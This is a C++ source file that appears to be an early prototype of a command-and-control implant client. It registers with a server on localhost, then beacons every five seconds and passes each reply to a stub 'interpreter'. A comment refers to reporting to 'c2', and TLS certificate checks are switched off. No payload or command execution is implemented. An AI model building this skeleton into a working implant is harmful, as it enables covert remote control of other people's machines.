// http-lib-test.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//
#include <iostream>

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "include/httplib.h"
#include "include/Serialization.h"
using namespace std;



string getHeartBeat(httplib::Client& client, string sessionId) {


    auto HBSerialized = nlohmann::json{
     { "sessionId", sessionId }
    };

    string heartBeatBody = HBSerialized.dump(); 
    cout << "HeartBeatBody: " << heartBeatBody << endl;
    httplib::Headers headers = {
    {"Content-Type", "application/json"}
    };

    auto result = client.Post("/heartBeat", headers, heartBeatBody, "application/json");
    if (!result) {
        cout << "Can't get heartBeat :/" << endl;
        return "error";
    }

   

    int status = result->status;
    string body = result->body;
    cout << "Status: " << status << endl;
    cout << "Body: " << body << endl;

    return body;

};

int interpreter(string deserialisedJsonObj) {
    cout << "[INTERPRETER] ==> " << deserialisedJsonObj << endl;
    return 0;
}





int main()
{

    std::cout << "Hello World!\n";
    httplib::Client cli("https://localhost");
    cli.enable_server_certificate_verification(false);

    auto res = cli.Get("/getSID");

    if (!res) {
        cout << "no res :/" << endl;
        return -1;

    }


    int status = res->status;
    string body = res->body;
    cout << "Status: " << status << endl;
    cout << "Body: " << body << endl;

    nlohmann::json resSIDjsonObj = nlohmann::json::parse(body);
    ResGetSid resGetSessId = resSIDjsonObj.get<ResGetSid>();

    cout << "sessionId: " << resGetSessId.sessionId << "; welcomeMsg: " << resGetSessId.welcomeMsg << endl;



    //ReqRegister req = { body };
    auto regSerialized = nlohmann::json{
        { "sessionId", resGetSessId.sessionId }
};

    string registerBody = regSerialized.dump();
    httplib::Headers headers = {
    {"Content-Type", "application/json"}
    };

    auto regRes = cli.Post("/register", headers, registerBody, "application/json");
    if (!regRes) {
        cout << "Can't register :/" << endl;
        return -1;
    }

    int regResStatus = regRes->status;

    if (regResStatus != 200) {
        cout << "Server error :/" << endl;
        return -1;
    }
    string regResBody = regRes->body;
    cout << "Status: " << regResStatus << "; Body: " << regResBody << endl;

    nlohmann::json resRegjsonObj = nlohmann::json::parse(regResBody);
    ResRegister resRegister = resRegjsonObj.get<ResRegister>();

    if (resRegister.resMsg == "OK") {
        cout << "Succesfully registered Yiiipiee" << endl;
    }

    string sessionId = resGetSessId.sessionId;
    while (1) {
        string response = getHeartBeat(cli, sessionId);
        // TODO: Manage error codes / reporting errors to c2
        int returnCode = interpreter(response); 
        Sleep(5000);
    }
    

}

// Exécuter le programme : Ctrl+F5 ou menu Déboguer > Exécuter sans débogage
// Déboguer le programme : F5 ou menu Déboguer > Démarrer le débogage

// Astuces pour bien démarrer : 
//   1. Utilisez la fenêtre Explorateur de solutions pour ajouter des fichiers et les gérer.
//   2. Utilisez la fenêtre Team Explorer pour vous connecter au contrôle de code source.
//   3. Utilisez la fenêtre Sortie pour voir la sortie de la génération et d'autres messages.
//   4. Utilisez la fenêtre Liste d'erreurs pour voir les erreurs.
//   5. Accédez à Projet > Ajouter un nouvel élément pour créer des fichiers de code, ou à Projet > Ajouter un élément existant pour ajouter des fichiers de code existants au projet.
//   6. Pour rouvrir ce projet plus tard, accédez à Fichier > Ouvrir > Projet et sélectionnez le fichier .sln.
